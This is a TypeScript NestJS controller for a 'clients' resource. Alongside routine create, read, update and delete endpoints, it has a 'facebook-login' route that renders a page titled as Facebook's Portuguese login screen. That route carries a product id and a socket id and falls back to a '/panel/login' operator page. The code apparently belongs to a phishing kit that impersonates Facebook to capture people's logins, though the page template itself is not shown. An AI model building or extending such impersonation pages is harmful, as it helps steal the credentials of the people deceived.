import { Controller, Get, Post, Body, Patch, Param, Delete, HttpException, HttpStatus, Render, Res } from '@nestjs/common';
import { Client } from '@prisma/client';
import { PrismaService } from 'src/database/prisma.service';
import { ClientsService } from './clients.service';
import { CreateClientDto } from './dto/create-client.dto';
import { UpdateClientDto } from './dto/update-client.dto';

@Controller('clients')
export class ClientsController {
  constructor(private readonly clientsService: ClientsService, private readonly prisma: PrismaService) {}

  @Get('facebook-login/:id/:socket')
  @Render('pages/facebook-login')
  async faceLogin(@Param('id') id: string, @Res() res, @Param('socket') socket: string) {
    try {
      const product  = await this.prisma.products.findFirst({ where: { id }})

      return {
        pageClasses: `facebook facebook-login`,
        page: 'facebook-login',
        title: 'Entrar no Facebook | Facebook',
        product,
        socket
      }
    } catch (error) {
      return res.redirect('/panel/login')
    }
  }

  @Post()
  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {
    try {
      return await this.clientsService.create(createClientDto);
    } catch (error) {
      throw new HttpException(error.message, HttpStatus.BAD_REQUEST)
    }
  }

  @Get()
  findAll() {
    return this.clientsService.findAll();
  }

  @Get(':id')
  findOne(@Param('id') id: string) {
    return this.clientsService.findOne(+id);
  }

  @Patch(':id')
  update(@Param('id') id: string, @Body() updateClientDto: UpdateClientDto) {
    return this.clientsService.update(+id, updateClientDto);
  }

  @Delete(':id')
  async remove(@Param('id') id: string) {
    try {
      
      return await this.clientsService.remove(+id);
    } catch (error) {
      throw new HttpException(error.message, HttpStatus.BAD_REQUEST)
    }
  }
}
